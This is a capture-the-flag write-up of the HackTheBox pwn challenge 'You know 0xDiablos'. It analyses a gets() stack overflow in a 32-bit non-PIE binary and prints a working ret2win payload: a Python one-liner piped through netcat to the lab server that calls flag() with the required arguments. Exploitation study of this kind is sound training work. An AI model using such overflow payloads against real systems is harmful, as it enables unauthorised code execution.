---
ctf: HTBLabs
title: You know 0xDiablos
category: pwn
difficulty: unknown
tags: []
flag_format: HTB{...}
date: 2026-08-11
---

# You know 0xDiablos

## Challenge
I missed my flag IP: 154.57.164.77:32394

## Approach

The supplied file is a 32-bit, non-PIE ELF with an executable stack and no stack
canary. Inspecting its symbols and disassembly revealed two important functions:

- `vuln()` reads user input with `gets()` into a 184-byte stack buffer.
- `flag()` opens `flag.txt`, but prints its contents only when called with the
  arguments `0xdeadbeef` and `0xc0ded00d`.

The vulnerable buffer begins at `[ebp-0xb8]`. The saved return address is reached
after the 184-byte buffer and the 4-byte saved `ebx`, giving an offset of 188
bytes. Because the binary is non-PIE, the address of `flag()` is fixed at
`0x080491e2`.

The stack after overwriting the return address must be arranged as follows:

```text
188 bytes padding
0x080491e2        address of flag()
0x41414141        dummy return address
0xdeadbeef        first argument
0xc0ded00d        second argument
```

The exploit was sent with:

```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*188+struct.pack("<IIII",0x080491e2,0x41414141,0xdeadbeef,0xc0ded00d)+b"\n")' | nc 154.57.164.77 32394
```

This redirects execution to `flag()` with the required arguments, causing the
remote process to print the flag.

## Tools

- `file`
- `readelf`
- `objdump`
- `strings`
- Python 3
- Netcat

## Lessons

- In 32-bit x86 calling conventions, function arguments are placed on the stack
  after the function's return address.
- Account for compiler-saved registers between a local buffer and the saved frame
  pointer. Here, the saved `ebx` adds four bytes to the overwrite offset.
- A non-PIE executable makes internal function addresses stable, enabling a
  direct ret2win attack without an address leak.

## Flag

```text
HTB{redacted}
```
